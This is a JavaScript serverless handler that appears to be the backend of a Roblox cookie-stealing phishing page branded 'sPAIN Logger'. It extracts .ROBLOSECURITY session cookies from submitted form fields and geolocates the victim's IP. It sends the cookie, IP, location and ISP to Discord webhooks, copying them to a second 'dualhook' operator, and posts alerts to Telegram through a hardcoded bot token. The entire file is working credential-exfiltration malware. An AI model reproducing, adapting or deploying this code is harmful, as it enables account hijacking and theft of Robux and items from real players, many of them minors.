// api/submit.js — cookie + IP + ISP only, zero Roblox API calls
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 4000);
    const r = await fetch(`https://ipapi.co/${ip}/json/`, { signal: controller.signal });
    clearTimeout(timer);
    const d = await r.json();
    if (d.error) return null;
    return { city: d.city, regionName: d.region, country: d.country_name, isp: d.org, status: 'success' };
  } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = String(raw).trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);                                if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

async function discordChunked(url, text) {
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1990); rem = rem.substring(1990);
    await discordSend(url, {
      content: first
        ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
        : chunk + (rem.length === 0 ? '\n```' : '')
    });
    first = false;
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') { try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); } }
  if (Buffer.isBuffer(body))   { try { body = JSON.parse(body.toString()); } catch { return res.status(400).json({ error: 'Invalid JSON' }); } }

  const { slug, slots } = body || {};
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  res.status(200).json({ success: true });

  try {
    const ip       = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
    const cookie   = findCookie(slots);
    const now      = new Date().toISOString();
    const pageName = record.displayName || slug;

    const webhooks = [record.webhook];
    if (record.dualhookParent) {
      try {
        const parent = await redisGet(`slot:${record.dualhookParent}`);
        if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
      } catch (_) {}
    }

    const geo      = await getIpGeo(ip);
    const location = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';

    if (!cookie) {
      for (const wh of webhooks) {
        await discordSend(wh, {
          embeds: [{
            title: '🤡 No Cookie / Troll',
            color: 0xff3333,
            fields: [
              { name: '🌐 IP',       value: ip,                   inline: true },
              { name: '📍 Location', value: location,             inline: true },
              { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true },
              { name: '🕐 Time',     value: now,                  inline: false },
            ],
            footer:    { text: `sPAIN Logger • ${pageName}` },
            timestamp: now
          }]
        });
      }
      await tgSend(`🤡 <b>TROLL — ${pageName}</b>\n🌐 <code>${ip}</code> — ${location}`);
      return;
    }

    for (const wh of webhooks) {
      await discordSend(wh, {
        content: '@everyone',
        embeds: [{
          title:       '🍪 Cookie Captured',
          description: ':fire: `sPAIN` :fire:',
          color:       0xc026d3,
          fields: [
            { name: '🌐 IP',       value: ip,                   inline: true },
            { name: '📍 Location', value: location,             inline: true },
            { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true },
            { name: '🕐 Time',     value: now,                  inline: false },
          ],
          footer:    { text: `sPAIN Logger • ${pageName}` },
          timestamp: now
        }]
      });
      await discordChunked(wh, cookie);
    }

    await tgSend([
      `🍪 <b>COOKIE — ${pageName}</b>`,
      `🌐 <code>${ip}</code> — ${location}`,
      `🗺️ ${geo?.isp || 'Unknown'}`,
      `🕐 ${now}`
    ].join('\n'));

  } catch (err) {
    console.error('Error:', err.message);
  }
}
